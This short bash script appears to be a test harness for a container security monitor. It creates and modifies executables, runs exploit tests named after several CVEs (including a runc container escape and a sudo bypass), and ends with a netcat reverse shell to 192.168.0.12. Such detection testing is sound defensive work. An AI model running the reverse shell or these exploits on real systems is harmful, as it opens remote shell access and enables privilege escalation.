#!/usr/bin/env bash

sleep 15

echo 'echo "Hi, I am a new binary."' > /app/new_binary.sh
chmod +x /app/new_binary.sh
./app/new_binary.sh

echo 'echo "Hi, I am modifying the existing script."' > /app/checked_binary.sh
./app/checked_binary.sh

python3 test/CVE-2019-3874/server.py
/usr/lib/go-1.10/bin/go run test/CVE-2019-5736/main.go
python3 test/CVE-2020-14386/server.py
./test/RS-SOCKET_AND_DUP2/script.sh
./test/CVE-2019-14287/script.sh
nc -e /bin/bash 192.168.0.12 1234
